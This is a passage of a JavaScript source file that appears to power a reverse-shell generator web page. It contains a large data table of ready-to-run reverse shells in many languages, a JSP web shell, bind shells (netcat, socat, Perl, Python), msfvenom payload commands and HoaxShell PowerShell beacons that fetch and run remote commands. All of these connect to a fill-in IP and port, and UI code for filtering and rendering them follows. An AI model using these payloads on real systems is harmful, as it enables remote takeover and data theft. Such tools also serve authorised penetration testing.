            command: "(function(){\\r\\n    var net = require(\"net\"),\\r\\n        cp = require(\"child_process\"),\\r\\n        sh = cp.spawn(\"bash\", []);\\r\\n    var client = new net.Socket();\\r\\n    client.connect({port}, \"{ip}\", function(){\\r\\n        client.pipe(sh.stdin);\\r\\n        sh.stdout.pipe(client);\\r\\n        sh.stderr.pipe(client);\\r\\n    });\\r\\n    return /a/; // Prevents the Node.js application from crashing\\r\\n})();",
            os: ["linux", "mac", "windows"],
            description: "Node.js TCP socket"
        },
        {
            name: "Java #1",
            command: "public class shell {\\n    public static void main(String[] args) {\\n        Process p;\\n        try {\\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\\n            p.waitFor();\\n            p.destroy();\\n        } catch (Exception e) {}\\n    }\\n}",
            os: ["linux", "mac"],
            description: "Java Runtime exec"
        },
        {
            name: "Java #2",
            command: "public class shell {\\n    public static void main(String[] args) {\\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1\")\\n            .redirectErrorStream(true);\\n        try {\\n            Process p = pb.start();\\n            p.waitFor();\\n            p.destroy();\\n        } catch (Exception e) {}\\n    }\\n}",
            os: ["linux", "mac"],
            description: "Java ProcessBuilder"
        },
        {
            name: "Java #3",
            command: "import java.io.InputStream;\\nimport java.io.OutputStream;\\nimport java.net.Socket;\\n\\npublic class shell {\\n    public static void main(String[] args) {\\n        String host = \"{ip}\";\\n        int port = {port};\\n        String cmd = \"bash\";\\n        try {\\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\\n            Socket s = new Socket(host, port);\\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\\n            while (!s.isClosed()) {\\n                while (pi.available() > 0)\\n                    so.write(pi.read());\\n                while (pe.available() > 0)\\n                    so.write(pe.read());\\n                while (si.available() > 0)\\n                    po.write(si.read());\\n                so.flush();\\n                po.flush();\\n                Thread.sleep(50);\\n                try {\\n                    p.exitValue();\\n                    break;\\n                } catch (Exception e) {}\\n            }\\n            p.destroy();\\n            s.close();\\n        } catch (Exception e) {}\\n    }\\n}",
            os: ["windows", "linux", "mac"],
            description: "Java Socket connection"
        },
        {
            name: "telnet",
            command: "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | bash 1>$TF",
            os: ["linux", "mac"],
            description: "Telnet with named pipes"
        },
        {
            name: "zsh",
            command: "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
            os: ["linux", "mac"],
            description: "Zsh TCP module"
        },
        {
            name: "Lua #1",
            command: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('bash -i <&3 >&3 2>&3');\"",
            os: ["linux"],
            description: "Lua socket connection"
        },
        {
            name: "Lua #2",
            command: "lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
            os: ["linux", "windows"],
            description: "Lua interactive shell"
        },
        {
            name: "Golang",
            command: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
            os: ["linux", "mac", "windows"],
            description: "Go reverse shell"
        },
        {
            name: "Vlang",
            command: "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e bash {ip} {port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
            os: ["linux", "mac"],
            description: "V language shell"
        },
        {
            name: "Awk",
            command: "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
            os: ["linux", "mac"],
            description: "Awk inet connection"
        },
        {
            name: "Dart",
            command: "import 'dart:io';\\nimport 'dart:convert';\\n\\nmain() {\\n  Socket.connect(\"{ip}\", {port}).then((socket) => {\\n    socket.listen((data) => {\\n      Process.start('bash', []).then((Process process) => {\\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\\n        process.stdout\\n          .transform(utf8.decoder)\\n          .listen((output) => { socket.write(output); });\\n      });\\n    },\\n    onDone: () => {\\n      socket.destroy();\\n    });\\n  });\\n}",
            os: ["linux", "mac", "windows"],
            description: "Dart socket connection"
        },
        {
            name: "Crystal",
            command: "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
            os: ["linux", "windows", "mac"],
            description: "Crystal language shell"
        },
        {
            name: "Javascript",
            command: "String command = \"var host = '{ip}';\" +\r\n                       \"var port = {port};\" +\r\n                       \"var cmd = 'bash';\"+\r\n                       \"var s = new java.net.Socket(host, port);\" +\r\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\r\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\r\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\r\n                       \"print ('Connected');\"+\r\n                       \"while (!s.isClosed()) {\"+\r\n                       \"    while (pi.available() > 0)\"+\r\n                       \"        so.write(pi.read());\"+\r\n                       \"    while (pe.available() > 0)\"+\r\n                       \"        so.write(pe.read());\"+\r\n                       \"    while (si.available() > 0)\"+\r\n                       \"        po.write(si.read());\"+\r\n                       \"    so.flush();\"+\r\n                       \"    po.flush();\"+\r\n                       \"    java.lang.Thread.sleep(50);\"+\r\n                       \"    try {\"+\r\n                       \"        p.exitValue();\"+\r\n                       \"        break;\"+\r\n                       \"    }\"+\r\n                       \"    catch (e) {\"+\r\n                       \"    }\"+\r\n                       \"}\"+\r\n                       \"p.destroy();\"+\r\n                       \"s.close();\";\r\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\r\nref.add(new StringRefAddr(\"x\", x);",
            os: ["linux", "mac", "windows"],
            description: "Javascript engine reverse shell"
        },
        {
            name: "Groovy",
            command: "String host=\"{ip}\";int port={port};String cmd=\"bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
            os: ["windows"],
            description: "Groovy reverse shell"
        },
        {
            name: "Java Two Way",
            command: "<%\r\n    /*\r\n     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r\n     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\r\n     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \r\n     * the command specified in the HTML form). This is to avoid to keep it simple.\r\n     */\r\n%>\r\n\r\n<%@page import=\"java.lang.*\"%>\r\n<%@page import=\"java.io.*\"%>\r\n<%@page import=\"java.net.*\"%>\r\n<%@page import=\"java.util.*\"%>\r\n\r\n<html>\r\n<head>\r\n    <title>jrshell</title>\r\n</head>\r\n<body>\r\n<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\r\n    <input TYPE=\"text\" NAME=\"shell\">\r\n    <input TYPE=\"submit\" VALUE=\"Send\">\r\n</form>\r\n<pre>\r\n<%\r\n    // Define the OS\r\n    String shellPath = null;\r\n    try\r\n    {\r\n        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\r\n            shellPath = new String(\"/bin/sh\");\r\n        } else {\r\n            shellPath = new String(\"cmd.exe\");\r\n        }\r\n    } catch( Exception e ){}\r\n    // INNER HTML PART\r\n    if (request.getParameter(\"shell\") != null) {\r\n        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\r\n        Process p;\r\n        if (shellPath.equals(\"cmd.exe\"))\r\n            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));\r\n        else\r\n            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));\r\n        OutputStream os = p.getOutputStream();\r\n        InputStream in = p.getInputStream();\r\n        DataInputStream dis = new DataInputStream(in);\r\n        String disr = dis.readLine();\r\n        while ( disr != null ) {\r\n            out.println(disr);\r\n            disr = dis.readLine();\r\n        }\r\n    }\r\n    // TCP PORT PART\r\n    class StreamConnector extends Thread\r\n    {\r\n        InputStream wz;\r\n        OutputStream yr;\r\n        StreamConnector( InputStream wz, OutputStream yr ) {\r\n            this.wz = wz;\r\n            this.yr = yr;\r\n        }\r\n        public void run()\r\n        {\r\n            BufferedReader r  = null;\r\n            BufferedWriter w = null;\r\n            try\r\n            {\r\n                r  = new BufferedReader(new InputStreamReader(wz));\r\n                w = new BufferedWriter(new OutputStreamWriter(yr));\r\n                char buffer[] = new char[8192];\r\n                int length;\r\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\r\n                {\r\n                    w.write( buffer, 0, length );\r\n                    w.flush();\r\n                }\r\n            } catch( Exception e ){}\r\n            try\r\n            {\r\n                if( r != null )\r\n                    r.close();\r\n                if( w != null )\r\n                    w.close();\r\n            } catch( Exception e ){}\r\n        }\r\n    }\r\n \r\n    try {\r\n        Socket socket = new Socket( \"{ip}\", {port} ); // Replace with wanted ip and port\r\n        Process process = Runtime.getRuntime().exec( shellPath );\r\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r\n        out.println(\"port opened on \" + socket);\r\n     } catch( Exception e ) {}\r\n%>\r\n</pre>\r\n</body>\r\n</html>",
            os: ["windows", "linux", "mac"],
            description: "Java Two Way web shell"
        },
    ],
    bind: [
        {
            name: "Python3 Bind",
            command: "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
            os: ["linux", "mac", "windows"],
            description: "Python3 bind shell"
        },
        {
            name: "PHP Bind",
            command: "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'",
            os: ["linux", "mac", "windows"],
            description: "PHP bind shell"
        },
        {
            name: "Netcat Bind",
            command: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
            os: ["linux", "mac"],
            description: "Netcat bind shell"
        },
        {
            name: "Netcat Bind -e",
            command: "nc -nlvp {port} -e /bin/bash",
            os: ["linux", "mac"],
            description: "Netcat bind shell with -e flag"
        },
        {
            name: "Perl Bind",
            command: "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
            os: ["linux", "mac"],
            description: "Perl bind shell"
        },
        {
            name: "Python Bind",
            command: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
            os: ["linux", "mac"],
            description: "Python bind shell"
        },
        {
            name: "Socat Bind",
            command: "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash",
            os: ["linux", "mac"],
            description: "Socat bind shell"
        }
    ],
    msfvenom: [
        {
            name: "Windows Meterpreter Staged Reverse TCP (x64)",
            command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            os: ["windows"],
            description: "Windows x64 staged meterpreter"
        },
        {
            name: "Windows Meterpreter Stageless Reverse TCP (x64)",
            command: "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            os: ["windows"],
            description: "Windows x64 stageless meterpreter"
        },
        {
            name: "Windows Staged Reverse TCP (x64)",
            command: "msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            os: ["windows"],
            description: "Windows x64 staged shell"
        },
        {
            name: "Windows Stageless Reverse TCP (x64)",
            command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            os: ["windows"],
            description: "Windows x64 stageless shell"
        },
        {
            name: "Linux x64",
            command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
            os: ["linux"],
            description: "Linux x64 reverse shell"
        },
        {
            name: "Linux x86",
            command: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
            os: ["linux"],
            description: "Linux x86 reverse shell"
        },
        {
            name: "Linux Meterpreter Staged Reverse TCP (x64)",
            command: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
            os: ["linux"],
            description: "Linux x64 staged meterpreter"
        },
        {
            name: "macOS Meterpreter Staged Reverse TCP (x64)",
            command: "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
            os: ["mac"],
            description: "macOS x64 staged meterpreter"
        },
        {
            name: "macOS Stageless Reverse TCP (x64)",
            command: "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
            os: ["mac"],
            description: "macOS x64 stageless shell"
        },
        {
            name: "Windows x86",
            command: "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
            os: ["windows"],
            description: "Windows x86 reverse shell"
        },
        {
            name: "PHP",
            command: "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw > shell.php",
            os: ["linux", "windows"],
            description: "PHP reverse shell"
        },
        {
            name: "PHP Meterpreter",
            command: "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
            os: ["linux", "windows"],
            description: "PHP meterpreter reverse shell"
        },
        {
            name: "ASP",
            command: "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f asp > shell.asp",
            os: ["windows"],
            description: "ASP reverse shell"
        },
        {
            name: "ASPX",
            command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
            os: ["windows"],
            description: "ASPX reverse shell"
        },
        {
            name: "JSP",
            command: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp",
            os: ["linux", "windows"],
            description: "JSP reverse shell"
        },
        {
            name: "WAR",
            command: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",
            os: ["linux", "windows"],
            description: "WAR reverse shell"
        },
        {
            name: "Android Meterpreter",
            command: "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
            os: ["android"],
            description: "Android meterpreter reverse shell"
        },
        {
            name: "Apple iOS Meterpreter",
            command: "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
            os: ["ios"],
            description: "Apple iOS meterpreter reverse shell"
        },
        {
            name: "Python Stageless",
            command: "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
            os: ["linux", "windows"],
            description: "Python stageless reverse shell"
        },
        {
            name: "Bash Stageless",
            command: "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
            os: ["linux", "mac"],
            description: "Bash stageless reverse shell"
        },
        {
            name: "Windows Bind TCP ShellCode",
            command: "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\\x00' -f python -v notBuf -o shellcode",
            os: ["windows"],
            description: "Windows bind TCP shellcode for buffer overflow"
        }
    ],
    hoaxshell: [
        {
            name: "Windows CMD cURL",
            command: "@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL",
            os: ["windows"],
            description: "HoaxShell Windows CMD with cURL"
        },
        {
            name: "PowerShell IEX",
            command: "$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
            os: ["windows"],
            description: "HoaxShell PowerShell with IEX"
        },
        {
            name: "PowerShell IEX Constr Lang Mode",
            command: "$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
            os: ["windows"],
            description: "HoaxShell PowerShell constrained language mode"
        },
        {
            name: "PowerShell Outfile",
            command: "$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
            os: ["windows"],
            description: "HoaxShell PowerShell with outfile"
        },
        {
            name: "PowerShell Outfile Constr Lang Mode",
            command: "$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
            os: ["windows"],
            description: "HoaxShell PowerShell outfile constrained language mode"
        },
        {
            name: "Windows CMD cURL HTTPS",
            command: "@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL",
            os: ["windows"],
            description: "HoaxShell Windows CMD with cURL over HTTPS"
        },
        {
            name: "PowerShell IEX HTTPS",
            command: "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
            os: ["windows"],
            description: "HoaxShell PowerShell IEX over HTTPS"
        },
        {
            name: "PowerShell Constr Lang Mode IEX HTTPS",
            command: "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
            os: ["windows"],
            description: "HoaxShell PowerShell constrained language mode IEX over HTTPS"
        },
        {
            name: "PowerShell Outfile HTTPS",
            command: "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
            os: ["windows"],
            description: "HoaxShell PowerShell outfile over HTTPS"
        },
        {
            name: "PowerShell Outfile Constr Lang Mode HTTPS",
            command: "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
            os: ["windows"],
            description: "HoaxShell PowerShell outfile constrained language mode over HTTPS"
        }
    ]
};

let currentTab = 'reverse';
let currentOS = 'all';
let currentSearch = '';
let selectedShell = null;

function initReverseShellGenerator() {
    // Tab switching
    document.querySelectorAll('.tab-button').forEach(button => {
        button.addEventListener('click', function() {
            switchTab(this.dataset.tab);
        });
    });
    
    // OS filtering
    document.querySelectorAll('.os-filter button').forEach(button => {
        button.addEventListener('click', function() {
            setOSFilter(this.dataset.os);
        });
    });
    
    // Search functionality
    document.getElementById('search-box').addEventListener('input', function() {
        currentSearch = this.value.toLowerCase();
        renderShells();
    });
    
    // IP and Port change handlers
    document.getElementById('ip-input').addEventListener('input', function() {
        saveSettings();
        updateAllExpandedShells();
    });
    document.getElementById('port-input').addEventListener('input', function() {
        saveSettings();
        updateAllExpandedShells();
    });
    document.getElementById('shell-select').addEventListener('change', function() {
        saveSettings();
        updateAllExpandedShells();
    });
    
    // Encoding change handlers
    document.querySelectorAll('input[name="encoding"]').forEach(radio => {
        radio.addEventListener('change', function() {
            saveSettings();
            updateAllExpandedShells();
        });
    });
    
    // Load saved settings
    loadSettings();
    
    // Initial render
    renderShells();
}

function switchTab(tab) {
    currentTab = tab;
    
    // Update tab buttons
    document.querySelectorAll('.tab-button').forEach(button => {
        button.classList.remove('active');
    });
    document.querySelector(`[data-tab="${tab}"]`).classList.add('active');
    
    // Update content
    document.querySelectorAll('.shell-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById(`${tab}-content`).classList.add('active');
    
    // Clear expanded shells and hide old command sections
    document.querySelectorAll('.shell-item').forEach(item => {
        item.classList.remove('expanded');
        const expandedSection = item.querySelector('.shell-expanded');
        const expandIcon = item.querySelector('.expand-icon');
        if (expandedSection) {
            expandedSection.style.display = 'none';
        }
        if (expandIcon) {
            expandIcon.style.transform = 'rotate(0deg)';
        }
    });
    
    // Hide old command output sections (if they exist)
    const commandOutput = document.getElementById('command-output');
    const listenerCommand = document.getElementById('listener-command');
    if (commandOutput) commandOutput.style.display = 'none';
    if (listenerCommand) listenerCommand.style.display = 'none';
    
    renderShells();
}

function setOSFilter(os) {
    currentOS = os;
    
    // Update OS buttons
    document.querySelectorAll('.os-filter button').forEach(button => {
        button.classList.remove('active');
    });
    document.querySelector(`[data-os="${os}"]`).classList.add('active');
    
    renderShells();
}

function renderShells() {
    let containerId;
    if (currentTab === 'reverse') {
        containerId = 'reverse-shell-list';
    } else if (currentTab === 'bind') {
        containerId = 'bind-shell-list';
    } else if (currentTab === 'msfvenom') {
        containerId = 'msfvenom-list';
    } else if (currentTab === 'hoaxshell') {
        containerId = 'hoaxshell-list';
    }
    
    const container = document.getElementById(containerId);
    container.innerHTML = '';
    
    const shells = shellData[currentTab] || [];
    const filteredShells = shells.filter(shell => {
        const osMatch = currentOS === 'all' || shell.os.includes(currentOS);
        const searchMatch = currentSearch === '' || 
                           shell.name.toLowerCase().includes(currentSearch) ||
                           shell.description.toLowerCase().includes(currentSearch);
        return osMatch && searchMatch;
    });
    
    filteredShells.forEach(shell => {
        const shellElement = document.createElement('div');
